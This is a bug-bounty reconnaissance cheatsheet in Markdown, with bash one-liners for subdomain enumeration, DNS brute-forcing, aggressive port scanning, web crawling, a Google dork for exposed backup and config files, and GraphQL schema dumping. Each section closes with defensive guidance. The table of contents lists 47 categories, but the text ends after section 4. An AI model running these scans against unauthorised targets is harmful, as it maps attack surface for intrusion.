# Web Recon & Vulnerability Hunting Master Cheatsheet 🚀 (2026 Edition)

![GitHub stars](https://img.shields.io/github/stars/manojxshrestha/oneliners?style=flat-square) ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Last commit](https://img.shields.io/github/last-commit/yourusername/yourrepo) ![Made with Bash](https://img.shields.io/badge/Made%20with-Bash-4EAA25?style=flat-square&logo=gnubash)

**Master Bug‑Hunting Cheatsheet for 2026** – A comprehensive consolidation of 47 vulnerability testing categories, with methodology, tool installation, detection commands, exploitation techniques, 2025–2026 trends, prevention guidance, and references.

**Categories (01–47)** include Recon Workflow, API & Auth Testing, Web Vulnerabilities, Cloud & JS Analysis, and Advanced/Specialized Checks, drawing from OWASP, PortSwigger, Web‑Vulnerability‑Testing‑Checklist, and up‑to‑date bug‑bounty write‑ups.

---

## 📋 Master Table of Contents

> 💡 **Quick Access**: All 47 categories contain comprehensive methodology, commands, advanced bypasses, and prevention guidance.

### Recon Workflow
- **[1. Preparation & Setup](#1-preparation--setup)** – Workspace configuration, target variables, tool management
- **[2. Target Scope & Subdomain Enumeration](#2-target-scope--subdomain-enumeration)** → [01‑Subdomain‑Enumeration](#01‑subdomain‑enumeration)
- **[3. Live Host / Asset Discovery](#3-live-host--asset-discovery)** → [02‑Live‑Host‑Discovery](#02‑live‑host‑discovery)
- **[4. URL & Endpoint Collection](#4-url--endpoint-collection)** → [03‑URL‑Collection](#03‑url‑collection)
- **[5. Sensitive Files & Secret Leakage Hunting](#5-sensitive-files--secret-leakage-hunting)** → [04‑Sensitive‑Files](#04‑sensitive‑files)
- **[6. Technology & Exposed Panel Detection](#6-technology--exposed-panel-detection)** → [05‑Technology‑Detection](#05‑technology‑detection)

### API & Authentication Testing
- **[7. API Recon & Security Testing](#7-api-recon--security-testing)** → [06‑API‑Testing](#06‑api‑testing), [07‑GraphQL](#07‑graphql), [08‑JWT](#08‑jwt), [09‑Authentication](#09‑authentication), [10‑API‑Key‑Leakage](#10‑api‑key‑leakage)

### Classic Web Vulnerabilities
- **[8. Classic Web Vulnerability Scanning](#8-classic-web-vulnerability-scanning)** → [11‑XSS](#11‑xss), [12‑SQL‑Injection](#12‑sql‑injection), [13‑SSRF](#13‑ssrf), [14‑SSTI](#14‑ssti), [15‑Open‑Redirect](#15‑open‑redirect), [16‑CRLF‑Injection](#16‑crlf‑injection), [17‑Path‑Traversal](#17‑path‑traversal), [18‑XXE](#18‑xxe), [19‑CORS](#19‑cors), [20‑HTTP‑Host‑Header‑Attacks](#20‑http‑host‑header‑attacks), [21‑Web‑Cache‑Poisoning](#21‑web‑cache‑poisoning), [22‑HTTP‑Request‑Smuggling](#22‑http‑request‑smuggling), [23‑Prototype‑Pollution](#23‑prototype‑pollution), [24‑DOM‑Based‑Vulnerabilities](#24‑dom‑based‑vulnerabilities)

### Cloud & JavaScript Analysis
- **[9. Cloud Assets & Misconfigurations](#9-cloud-assets--misconfigurations)** → [25‑AWS‑S3‑Bucket‑Hunting](#25‑aws‑s3‑bucket‑hunting), [26‑Firebase‑Database](#26‑firebase‑database), [27‑Azure‑Blob‑Storage](#27‑azure‑blob‑storage), [28‑GCP‑Storage](#28‑gcp‑storage), [29‑Cloud‑Credential‑Files](#29‑cloud‑credential‑files)
- **[10. JavaScript Analysis & Client‑Side Secrets](#10-javascript-analysis--client-side-secrets)** → [30‑JavaScript‑Analysis](#30‑javascript‑analysis)

### Advanced & Specialized Checks
- **[11. Advanced / Specialized Checks](#11-advanced--specialized-checks)** → [31‑Command‑Injection](#31‑command‑injection), [32‑Business‑Logic](#32‑business‑logic), [33‑File‑Upload](#33‑file‑upload), [34‑Web‑Cache‑Deception](#34‑web‑cache‑deception), [35‑CSRF](#35‑csrf), [36‑Clickjacking](#36‑clickjacking), [37‑Insecure‑Deserialization](#37‑insecure‑deserialization), [38‑OAuth‑Authentication](#38‑oauth‑authentication), [39‑NoSQL‑Injection](#39‑nosql‑injection), [40‑Race‑Conditions](#40‑race‑conditions), [41‑WebSockets](#41‑websockets), [42‑Directory‑File‑Enumeration](#42‑directory‑file‑enumeration), [43‑CSP‑Bypass](#43‑csp‑bypass), [44‑Nuclei‑Vuln‑Scanning](#44‑nuclei‑vuln‑scanning), [45‑CVE‑Specific‑Checks](#45‑cve‑specific‑checks), [46‑Specialized‑Recon](#46‑specialized‑recon), [47‑Nuclei‑Cheat](#47‑nuclei‑cheat)

- **[12. Important Notes & Best Practices](#12-important-notes--best-practices)** – Legal, ethical, rate limiting, WAF bypass, workflow

- **[13. References](#13-references)** – Aggregated references from all 47 enhanced categories

---

## 1. Preparation & Setup

💡 **Tip**: Before starting, set up your target variable and organize your workspace for efficient hunting.

### Setting Target Variable

Define your target domain to use throughout the testing session:

```bash
export domain=example.com
export target_url="https://example.com"
export scope_file="scope.txt"
mkdir -p {recon,vulns,logs,outputs}
```

### Essential Tools & Installation

Ensure you have the latest versions of core tools:

```bash
# Update package lists and install essential tools
sudo apt update && sudo apt install -y git curl wget jq python3 python3-pip golang nmap
```

### Nuclei Setup & Template Updates

```bash
# Install/update Nuclei (vulnerability scanner)
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update  # Update nuclei
nuclei -ut      # Update templates
```

### Wordlist Management

Keep wordlists updated for effective reconnaissance:

```bash
# Download latest Seclists
git clone https://github.com/danielmiessler/SecLists.git /home/pwn/wordlists/seclists
# Custom wordlists
mkdir -p /home/pwn/wordlists/custom
```

### Workspace Organization

Structure your workspace for efficient bug‑bounty hunting:

```bash
# Create organized directory structure
mkdir -p ~/bugbounty/{$domain}/{recon,subdomains,live,urls,tech,js,api,vulns,logs,screenshots}
cd ~/bugbounty/$domain
```

### Environment Variables

Set up persistent environment variables in your shell profile:

```bash
# Add to ~/.bashrc or ~/.zshrc
export WORDLISTS_DIR="/home/pwn/wordlists"
export TOOLS_DIR="$HOME/tools"
export DOMAIN="example.com"
export TARGETS="scope.txt"
export PATH="$PATH:$TOOLS_DIR/go/bin:$TOOLS_DIR"
```

### Proxy Configuration (Optional)

For Burp Suite integration:

```bash
export http_proxy="http://127.0.0.1:8080"
export https_proxy="http://127.0.0.1:8080"
```

### Tool Updates Script

Create an update script for regular tool maintenance:

```bash
cat > ~/update_tools.sh << 'EOF'
#!/bin/bash
echo "[+] Updating package lists..."
sudo apt update && sudo apt upgrade -y

echo "[+] Updating Nuclei..."
nuclei -update
nuclei -ut

echo "[+] Updating wordlists..."
cd /home/pwn/wordlists/seclists && git pull

echo "[+] Updating custom tools..."
cd ~/tools && find . -type d -name ".git" | while read dir; do
  cd "$(dirname "$dir")" && git pull
done

echo "[+] Update complete!"
EOF
chmod +x ~/update_tools.sh
```

---

## 2. Target Scope & Subdomain Enumeration

> Comprehensive subdomain enumeration methodology for bug‑bounty reconnaissance, incorporating passive/active techniques, DNS brute‑forcing, certificate transparency, automation, and 2025–2026 trends (cloud‑native subdomains, wildcard handling, CDN bypass, automated asset discovery).

Subdomain enumeration is the foundation of attack‑surface mapping. Discover all subdomains belonging to your target to maximize coverage.

### 🚀 Automated Subdomain Enumeration (Recommended)

Use **[subenum](https://github.com/manojxshrestha/subenum)** - A fast, automated bash-based subdomain enumeration tool that:
- Collects subdomains from **50+ passive sources** (Subfinder, Amass, Assetfinder, Findomain)
- Performs **FFUF DNS brute-forcing**
- **Automatically probes live hosts** (HTTP/HTTPS with status codes, titles, tech detection)
- ASN/Organization-based enumeration
- Certificate transparency search
- Parallel execution for faster results

**Installation:**
```bash
git clone https://github.com/manojxshrestha/subenum.git
cd subenum
chmod +x install.sh && ./install.sh
```

**Usage:**
```bash
# Make executable
chmod +x subenum.sh

# Basic subdomain enumeration
./subenum.sh -d target.com

# With FFUF bruteforce + HTTP probing (auto filter live hosts)
./subenum.sh -d target.com -fb -hp

# Parallel mode (fastest - auto runs FFUF + HTTP probe)
./subenum.sh -d target.com -p

# Full mode (parallel + ASN enumeration)
./subenum.sh -d target.com -p -an
```

**Output:** Results saved in `results/` folder:
- `alive-domains.txt` - Live probed hosts
- `https-subs.txt` - HTTPS subdomains

---

### Methodology (Reconnaissance Workflow)

**1. Passive Enumeration (No direct interaction)**  
- Certificate Transparency logs (crt.sh, certspotter)  
- Search engines (Google dorks, Shodan, Censys)  
- DNS dumpster, SecurityTrails, RiskIQ, VirusTotal  
- Historical data (Wayback Machine, Common Crawl)  

**2. Active Enumeration (Direct interaction)**  
- DNS brute‑forcing (wordlist‑based)  
- DNS zone transfers (AXFR) – rarely works  
- Subdomain permutations/alterations (alt‑dns, gotator)  
- Virtual host discovery (HTTP Host header)  

**3. Automation & Tool Chaining**  
- Chain multiple tools for comprehensive coverage  
- Deduplicate results with `anew`, `sort -u`  
- Resolve to IPs, filter live hosts with `httpx`/`httprobe`  
- Validate scope, avoid out‑of‑scope assets  

**4. Advanced Techniques (2025–2026 Trends)**  
- Cloud‑native subdomains (AWS/Azure/GCP load balancers, serverless)  
- Wildcard handling and bypass (DNS caching, timing attacks)  
- CDN edge‑case discovery (origin IPs via DNS history)  
- Automated asset discovery with `amass`, `subfinder`, `assetfinder`  

### Tool Installation & Setup

```bash
# Core enumeration tools
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/OWASP/Amass/v3/...@latest
go install github.com/tomnomnom/assetfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

# Additional tools
go install github.com/ffuf/ffuf@latest
go install github.com/OJ/gobuster/v3@latest
sudo apt install -y dnsutils whois

# Wordlists
git clone https://github.com/danielmiessler/SecLists.git /home/pwn/wordlists/seclists
```

### Passive Enumeration Commands

```bash
# 1. Subfinder – multi‑source passive enumeration
subfinder -d example.com -all -o subfinder.txt

# 2. Amass – comprehensive passive/active
amass enum -passive -d example.com -o amass-passive.txt

# 3. Assetfinder – simple and fast
assetfinder --subs-only example.com | anew assetfinder.txt

# 4. Certificate Transparency (crt.sh)
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew crt-sh.txt

# 5. Combine and deduplicate
cat subfinder.txt amass-passive.txt assetfinder.txt crt-sh.txt | sort -u | anew all-passive-subs.txt
```

### Active Enumeration Commands

```bash
# 1. DNS brute‑forcing with FFUF
ffuf -u https://FUZZ.example.com -w /home/pwn/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -timeout 20 -rate 100 -o ffuf.txt

# 2. DNS brute‑force with gobuster (DNS mode)
gobuster dns --domain example.com -w /home/pwn/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30 --delay 200ms --resolver 1.1.1.1:53 --timeout 2s --wildcard -o gobuster-dns.txt

# 3. Extract URLs from FFUF results
jq -r '.results[].url' ffuf.txt | anew ffuf-urls.txt

# 4. Convert to HTTPS URLs and probe with httpx
cat gobuster-dns.txt | sed 's/\x1b\[[0-9;]*m//g' | awk '{print "https://"$1}' | httpx -silent -o https-subs.txt

# 5. Subdomain permutations with alt‑dns (if installed)
altdns -i all-passive-subs.txt -o altdns-output.txt -w /home/pwn/wordlists/seclists/Discovery/DNS/altdns-words.txt -r -s altdns-resolved.txt
```

### Advanced Techniques & Automation

```bash
# 1. Automated enumeration script (example)
#!/bin/bash
domain=$1
echo "[+] Starting subdomain enumeration for $domain"
subfinder -d $domain -o subfinder_$domain.txt
amass enum -passive -d $domain -o amass_$domain.txt
assetfinder --subs-only $domain > assetfinder_$domain.txt
curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crt_$domain.txt
cat subfinder_$domain.txt amass_$domain.txt assetfinder_$domain.txt crt_$domain.txt | sort -u | anew all_subs_$domain.txt
ffuf -u https://FUZZ.$domain -w /home/pwn/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -o ffuf-$domain.txt
jq -r '.results[].url' ffuf-$domain.txt | anew ffuf_urls_$domain.txt
echo "[+] Done. Total subdomains found: $(wc -l < all_subs_$domain.txt)"

# 2. Find organization ASN ranges for IP‑based discovery
echo 'target_org' | metabigor net --org -v | awk 'NR>1 && $1 ~ /\// {print $1}' | sort -u | xargs -I{} prips {} 2>/dev/null | hakrevdns | anew asn-results.txt

# 3. Google Dorks for initial recon
site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```

### Prevention Guidance (Defensive Perspective)

1. **Limit DNS zone transfers** – Restrict AXFR queries to authorized IPs
2. **Monitor certificate transparency** – Detect unauthorized certificates
3. **Subdomain takeovers** – Remove unused DNS records (CNAME to external services)
4. **Wildcard DNS** – Use judiciously; consider explicit records
5. **Asset inventory** – Maintain accurate list of owned subdomains
6. **DNS security** – Implement DNSSEC, monitor for unusual queries
7. **Cloud misconfigurations** – Secure S3 buckets, Azure blobs, GCP storage

### References

- **[subenum](https://github.com/manojxshrestha/subenum)** - Automated subdomain enumeration tool
- [OWASP Testing Guide – Information Gathering](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/)
- [Bug Bounty Playbook – Reconnaissance](https://github.com/yeswehack/vulnerability-disclosure-policy)
- [Certificate Transparency – crt.sh](https://crt.sh/)
- Tools: [subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [FFUF](https://github.com/ffuf/ffuf)

---

## 3. Live Host / Asset Discovery

> Comprehensive live host discovery methodology for bug‑bounty reconnaissance, incorporating HTTP probing, port scanning, service fingerprinting, asset correlation, and 2025–2026 trends (cloud‑native services, serverless endpoints, CDN edge detection, automated asset correlation).

Filter discovered subdomains to find only live/responsive hosts, identify open ports, fingerprint services, and correlate assets across IP ranges.

### 🚀 Automated (Recommended)

> **💡 Tip:** Use **[subenum](https://github.com/manojxshrestha/subenum)** with `-fb -hp` flags for automated subdomain discovery + live host filtering in one step!

```bash
# Using subenum - auto discovers subdomains AND probes live hosts
./subenum.sh -d target.com -fb -hp

# Results saved in results/ folder:
# - alive-domains.txt  # Live probed hosts
# - https-subs.txt      # HTTPS subdomains with status codes
```

---

### Methodology (Asset Discovery Workflow)

**1. HTTP/HTTPS Probing**  
- Probe discovered subdomains with `httpx`, `httprobe`  
- Check multiple ports (80, 443, 8080, 8443, etc.)  
- Gather response headers, status codes, titles, technologies  
- Filter by status codes (200, 301, 302, 403, 500)  

**2. DNS Resolution & IP Mapping**  
- Resolve domains to IPs with `dnsx`, `massdns`  
- Identify shared IPs (virtual hosting)  
- Reverse DNS lookups (PTR records) for additional subdomains  
- ASN/organization mapping  

**3. Port Scanning & Service Detection**  
- Fast port scanning with `naabu`, `rustscan`, `masscan`  
- Service fingerprinting with `nmap -sV`  
- Identify high‑value ports (web, databases, management interfaces)  
- Correlate open ports with known vulnerabilities  

**4. Asset Correlation & Enrichment**  
- Shodan, Censys, ZoomEye for external exposure  
- SSL certificate analysis for subdomain discovery  
- Technology stack identification (`wappalyzer`, `whatweb`)  
- Merge and deduplicate results  

**5. Advanced Techniques (2025–2026 Trends)**  
- Cloud‑native service discovery (AWS API Gateway, Azure Functions, GCP Cloud Run)  
- Serverless endpoint detection (cold‑start timing, unique headers)  
- CDN edge detection and origin IP discovery  
- Automated asset correlation with `chaos‑client`, `project‑discovery` ecosystem  

### Tool Installation & Setup

```bash
# HTTP probing
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/tomnomnom/httprobe@latest

# DNS resolution
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest

# Port scanning
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
cargo install rustscan
sudo apt install -y nmap masscan

# Asset correlation
pip3 install shodan censys
go install github.com/projectdiscovery/chaos-client/cmd/chaos@latest
```

### HTTP/HTTPS Probing Commands

```bash
# 1. Basic httpx probing
httpx -l urls.txt -o ffufsubdomains.txt

# 2. Comprehensive probing with technology detection
cat ffufsubdomains.txt | sed 's|^https\?://||' | httpx -ports 80,443 -status-code -mc 200,301,302,403,500 -title -tech-detect -web-server -threads 100 -silent -o status.txt

# 3. Advanced live host detection with DNS resolution
dnsx -l final-subdomains.txt -silent -a | cut -d ' ' -f1 | httpx -ports 80,443 -status-code -mc 200,301,302,403,500 -title -tech-detect -web-server -threads 100 -silent -o alive-subs.txt

# 4. Merge and deduplicate
cat alive-subs.txt status.txt | sort -u | anew filtersubs.txt

# 5. Clean domain lists
cat filtersubs.txt | awk '{print $1}' | sed 's|https\?://||' | sed 's|/$||' | sort -u > alive-domains.txt
cut -d ' ' -f1 filtersubs.txt > https-subs.txt
```

### DNS Resolution & IP Mapping

```bash
# 1. DNS resolution to IPs
dnsx -l alive-domains.txt -a -resp-only -o ips.txt

# 2. Reverse DNS lookups
cat ips.txt | dnsx -retry 3 -threads 300 -stats -silent -resp-only -ptr | tee -a dnsx.txt

# 3. Shodan IP discovery (requires API key)
shodan search "ssl:'domain.tld or .com'" --fields ip_str --limit 1000 >> ips.txt

# 4. Merge all discovered assets
cat alive-domains.txt ips.txt | sort -u > all-assets.txt
```

### Port Scanning & Service Detection

```bash
# 1. Fast port discovery with Naabu
naabu -list all-assets.txt -top-ports 1000 -o all-assets-with-ports.txt -silent -c 50

# 2. With Nmap service detection
naabu -list all-assets.txt -top-ports 1000 -nmap-cli 'nmap -sV --top-ports 100 -Pn -oN -' -o all-assets-with-ports.txt -silent -c 50

# 3. Targeted port scanning with RustScan
rustscan -a ips.txt -p 80,81,443,8080,8443,8000,8008,8888,22,21,23,25,53,110,143,3306,3389,5900,6379,7001,9200,27017 --ulimit 5000 -- -sV -oX Output.xml

# 4. Parse RustScan results
grep "open" Output.xml
cat Output.xml | grep "http" > http-services.txt

# 5. Nmap SSL certificate scanning for subdomain discovery
sudo nmap -sS -n -Pn --top-ports 1000 --max-hostgroup 1 --max-rtt-timeout 100ms --min-rate 65535 --open --script ssl-cert.nse -iL ips.txt -oX Output2.xml
grep -oP 'dNSName: \K[^"]*' Output2.xml | sort -u > subdomains.txt
grep -oP 'commonName: \K[^"]*' Output2.xml | sort -u > domains.txt
grep -i "staging\|dev\|test\|qa" Output2.xml
grep "expired\|invalid" Output2.xml

# 6. Parse Nmap XML with Tew
tew -x Output2.xml | tee -a IN.txt
```

### High‑Value Ports Reference

| Port | Service | Why it matters |
|------|---------|----------------|
| 443 / 8443 | HTTPS | Web apps, APIs, admin panels |
| 8080 / 8000 / 8888 | HTTP alt | Admin panels, dev apps, Jenkins |
| 9200 | Elasticsearch | Often unauthenticated, data exposure |
| 6379 | Redis | Misconfiguration → critical (RCE) |
| 7001 | WebLogic | History of RCE vulnerabilities |
| 3306 | MySQL | Database exposure, weak credentials |
| 3389 | RDP | Remote desktop, brute‑force target |
| 22 | SSH | Configuration issues, key‑based auth |
| 21 | FTP | Anonymous access, credential leaks |
| 25 | SMTP | Email server misconfigurations |
| 53 | DNS | Zone transfers, cache poisoning |
| 5985/5986 | WinRM | Windows Remote Management |

### Advanced Techniques & Automation

```bash
# 1. Automated live host discovery script
#!/bin/bash
input=$1
echo "[+] Probing live hosts from $input"
httpx -l $input -o httpx-live.txt
cat httpx-live.txt | sed 's|^https\?://||' | httpx -ports 80,443,8080,8443 -status-code -title -tech-detect -web-server -threads 200 -silent -o httpx-detailed.txt
dnsx -l $input -silent -a -o dnsx-ips.txt
naabu -list dnsx-ips.txt -top-ports 100 -o naabu-ports.txt -silent
echo "[+] Live hosts: $(wc -l < httpx-live.txt)"
echo "[+] Open ports: $(wc -l < naabu-ports.txt)"

# 2. Cloud‑native service discovery (AWS example)
aws s3 ls | grep -E 'target|company'  # Find S3 buckets
aws ec2 describe-instances --query 'Reservations[*].Instances[*].PublicIpAddress' --output text | tee aws-ips.txt

# 3. CDN detection and origin IP discovery
cat alive-domains.txt | httpx -silent -cdn | grep -v "true" > non-cdn.txt  # Potential origin IPs
cat alive-domains.txt | httpx -silent -asn | grep -E "13335|15169|16509" > cloudflare-ips.txt  # CDN‑hosted
```

### Prevention Guidance (Defensive Perspective)

1. **Limit exposed services** – Firewall rules, security groups, network ACLs
2. **Regular port scanning** – Internal scans to detect unintended exposure
3. **Service hardening** – Disable unnecessary services, use strong authentication
4. **Cloud security** – Restrict public IPs, use private endpoints, VPC peering
5. **CDN configuration** – Proper origin hiding, WAF rules, rate limiting
6. **Asset inventory** – Maintain accurate list of all internet‑facing assets
7. **Monitoring & alerting** – Detect unauthorized port openings, new subdomains

### References

- **[subenum](https://github.com/manojxshrestha/subenum)** - Subdomain + Live host enumeration
- [OWASP Testing Guide – Configuration Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/)
- [PortSwigger – Network Security Testing](https://portswigger.net/web-security/network-security-testing)
- [Shodan](https://www.shodan.io/), [Censys](https://censys.io/) – Internet‑wide scan data
- Tools: [httpx](https://github.com/projectdiscovery/httpx), [dnsx](https://github.com/projectdiscovery/dnsx), [naabu](https://github.com/projectdiscovery/naabu), [rustscan](https://github.com/RustScan/RustScan)

---

## 4. URL & Endpoint Collection

> Comprehensive URL and endpoint collection methodology for bug‑bounty reconnaissance, incorporating historical data, web crawling, JavaScript analysis, parameter extraction, and 2025–2026 trends (API endpoint discovery, GraphQL introspection, serverless function mapping, automated parameter mining).

Crawl discovered hosts to build a comprehensive URL list for vulnerability testing, including historical URLs, dynamically generated endpoints, API routes, and hidden parameters.

### Methodology (Endpoint Discovery Workflow)

**1. Historical URL Collection**  
- Wayback Machine, Common Crawl, AlienVault OTX  
- Tools: `waymore`, `gau` (GetAllUrls), `urlfinder`  
- Extract URLs from historical snapshots, JavaScript files, source code  
- Filter by target domain, subdomains, remove duplicates  

**2. Active Web Crawling**  
- Traditional crawling (`katana`, `hakrawler`, `gospider`)  
- JavaScript‑aware crawling (`katana -jc`, `gospider -js`)  
- Form extraction, link discovery, parameter mining  
- Depth‑limited to avoid infinite loops, respect robots.txt  

**3. JavaScript Analysis for Hidden Endpoints**  
- Static analysis of JavaScript files for API endpoints, hidden paths  
- Tools: `LinkFinder`, `JS‑scan`, `greedy`, `secretfinder`  
- Extract URLs from `fetch`, `axios`, `XMLHttpRequest` calls  
- Identify GraphQL endpoints, WebSocket connections  

**4. Parameter Discovery & Enrichment**  
- Extract parameters from URLs (`?id=`, `&token=`)  
- Tools: `arjun`, `paramspider`, `paramminer`  
- Identify hidden parameters, test for injection points  
- Enrich URLs with common parameter payloads  

**5. Advanced Techniques (2025–2026 Trends)**  
- API endpoint discovery via `kiterunner`, `burp‑suite`  
- GraphQL introspection for schema dumping  
- Serverless function mapping (AWS Lambda, Azure Functions)  
- Automated parameter mining with ML‑based tools  

### Tool Installation & Setup

```bash
# Historical URL collection
pip3 install waymore
go install github.com/lc/gau/v2/cmd/gau@latest

# Web crawling
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/jaeles-project/gospider@latest

# JavaScript analysis
pip3 install LinkFinder
go install github.com/003random/getJS@latest
go install github.com/gwen001/github-subdomains@latest

# Parameter discovery
pip3 install arjun
go install github.com/devanshbatham/paramspider@latest

# Deduplication
go install github.com/s0md3v/uro@latest
```

### Historical URL Collection Commands

```bash
# 1. Waymore – comprehensive historical data
waymore -i example.com -mode U -oU wayurls.txt

# 2. GAU – GetAllUrls
echo "example.com" | gau --threads 10 --subs | anew gauurls.txt

# 3. Combine and deduplicate historical URLs
cat wayurls.txt gauurls.txt | uro | sort -u > waygauurls.txt

# 4. Alternative: urlfinder
cat alive-domains.txt | xargs -I@ urlfinder @ -o urlfinder_@.txt
```

### Active Web Crawling Commands

```bash
# 1. Hakrawler – fast crawling
cat https-subs.txt | hakrawler -subs -u -d 3 > hakcrawlurls.txt

# 2. Katana – modern crawler with JavaScript execution
cat scopeurls.txt | katana -d 3 -jc -timeout 15 -c 20 -kf -fx ssr -aff | anew crawledurls.txt

# 3. Katana for HTTPS subdomains
cat https-subs.txt | katana -d 3 -jc -timeout 15 -c 20 | anew cleansubskatanaurls.txt

# 4. GoSpider – sophisticated spider
gospider -S https-subs.txt -o gooutput -c 10 -d 3 -t 20

# 5. Extract URLs from GoSpider output
find gooutput -name "*.txt" -exec cat {} \; | grep -oE 'https?://[^ ]+' | anew gospider-urls.txt

# 6. Merge crawl results
cat waygauurls.txt crawledurls.txt | uro > katanaurls.txt
cat waygauurls.txt cleansubskatanaurls.txt hakcrawlurls.txt | uro > katanaurls.txt
```

This below script filters URLs from `katanaurls.txt` that belong to a user-specified domain and saves them to `crawledurls.txt`.

```bash
nano filter.sh
chmod +x filter.sh
./filter.sh
```
```bash
#!/bin/bash

input_file="katanaurls.txt"
output_file="crawledurls.txt"

# Check if input file exists
if [ ! -f "$input_file" ]; then
    echo "Error: Input file '$input_file' not found in the current directory."
    exit 1
fi

# Prompt user for domain
read -p "Enter domain to filter (e.g., example.com): " domain

# Exit if no domain entered
if [ -z "$domain" ]; then
    echo "No domain entered. Exiting."
    exit 1
fi

# Escape dots in the domain for regex
escaped_domain=$(printf '%s\n' "$domain" | sed 's/\./\\./g')

# Filter URLs belonging to the domain
# Pattern: match http:// or https:// followed by an optional subdomain part,
# then the domain, and ensure the hostname ends there (next character is / or : or ? or end of line).
grep -E -i "https?://([a-zA-Z0-9.-]+\.)?$escaped_domain([/:?]|$)" "$input_file" > "$output_file"

echo "Filtered URLs saved to $output_file"
```

### JavaScript Analysis for Hidden Endpoints

```bash
# 1. Extract live JavaScript files
cat crawledurls.txt | grep "\.js" | grep -Ev "\.json|\.jsp" | sort -u | httpx -silent -mc 200,301,302 -threads 200 -o livejslinks.txt

# 2. LinkFinder – find endpoints in JS files
cat livejslinks.txt | xargs -I@ python3 ~/tools/LinkFinder/linkfinder.py -i @ -o cli | grep -E "(http|https)://" | anew js-endpoints.txt

# 3. Extract API endpoints from JS files (modern approach)
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo '"(/api/[^"]+|\/v[0-9]+/[^"]+|/graphql[^"]*)"' | sed 's/"//g' | sort -u > js-api-endpoints.txt

# 4. Extract fetch/axios calls with parameters
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo 'fetch\(["'"'"'][^"'"'"']+["'"'"']\)|axios\.(get|post|put|delete)\(["'"'"'][^"'"'"']+["'"'"']\)' | sed -E "s/.*['\"]([^'\"]+)['\"].*/\1/" | sort -u > api-calls.txt

# 5. GetJS – extract JavaScript files from pages
cat alive-domains.txt | getJS -complete | anew all-js-files.txt
```

### Parameter Discovery & Enrichment

```bash
# 1. Arjun – hidden parameter discovery
arjun -u https://target.com/api/endpoint -o params.json

# 2. Batch process multiple endpoints
cat api-endpoints.txt | xargs -I@ arjun -u @ -o @-params.json 2>/dev/null

# 3. ParamSpider – parameter mining
python3 paramspider.py -d example.com -o paramspider-output.txt

# 4. Extract parameters from existing URLs
cat crawledurls.txt | grep -oE '\?[^ ]+' | sed 's/^?//' | tr '&' '\n' | cut -d'=' -f1 | sort -u > known-params.txt

# 5. Enrich URLs with common parameters
cat crawledurls.txt | python3 ~/tools/ParamMiner/paraminer.py -o enriched-urls.txt
```

### Prepare Final URL List

```bash
# 1. Combine all discovered URLs and deduplicate
cat alivesubsurls.txt katanaurls.txt | sort -u | anew tempcrawled.txt
uro -i tempcrawled.txt -o crawledurls.txt

# 2. Filter by file extensions (remove static files)
cat crawledurls.txt | grep -vE '\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|pdf|docx|xlsx|pptx)$' > dynamic-urls.txt

# 3. Extract unique paths for directory brute‑forcing
cat crawledurls.txt | sed 's|?.*||' | sed 's|#.*||' | sort -u > unique-paths.txt

# 4. Get IPs from alive-domains.txt (from subenum results)
dnsx -l alive-domains.txt -a -resp-only -o ips.txt

# 5. DNS PTR record lookup
cat ips.txt | dnsx -retry 3 -threads 300 -stats -silent -resp-only -ptr | tee -a dnsx.txt

# 6. Screenshot for visual recon
./gowitness scan file -f dnsx.txt --screenshot-path ./screenshots --threads 10 --timeout 60 --screenshot-fullpage --write-db --write-jsonl

# 7. Copy screenshots to desktop (adjust path)
cp -rv screenshots /mnt/c/Users/manoj/OneDrive/Desktop/
```

### Advanced Techniques & Automation

```bash
# 1. Automated URL collection script
#!/bin/bash
domain=$1
echo "[+] Collecting URLs for $domain"
echo "$domain" | gau --subs | anew gau_$domain.txt
waymore -i $domain -mode U -oU waymore_$domain.txt
cat https-subs.txt | katana -d 3 -jc | anew katana_$domain.txt
cat gau_$domain.txt waymore_$domain.txt katana_$domain.txt | uro | sort -u > all_urls_$domain.txt
echo "[+] Total URLs collected: $(wc -l < all_urls_$domain.txt)"

# 2. API endpoint discovery with kiterunner
kr scan https://target.com -w /home/pwn/wordlists/api/raft-large-directories.txt -x 20 -j 100 -o kr-results.json

# 3. GraphQL introspection
curl -X POST https://target.com/graphql -H "Content-Type: application/json" --data '{"query":"{__schema{types{name fields{name args{name description type{name kind}} description}}}}"}' | jq . > graphql-schema.json

# 4. Serverless function mapping (AWS CLI example)
aws lambda list-functions --query 'Functions[*].FunctionName' --output text | tee lambda-functions.txt
```

### Prevention Guidance (Defensive Perspective)

1. **Limit exposed endpoints** – Review and remove unused API routes, debug endpoints
2. **Parameter validation** – Validate all input parameters, use allow‑lists
3. **JavaScript obfuscation** – Minimize exposure of API endpoints in client‑side code
4. **GraphQL security** – Disable introspection in production, implement query depth limiting
5. **Crawler control** – Implement `robots.txt`, rate limiting, CAPTCHA for sensitive endpoints
6. **Asset inventory** – Maintain accurate list of all URLs, endpoints, API routes
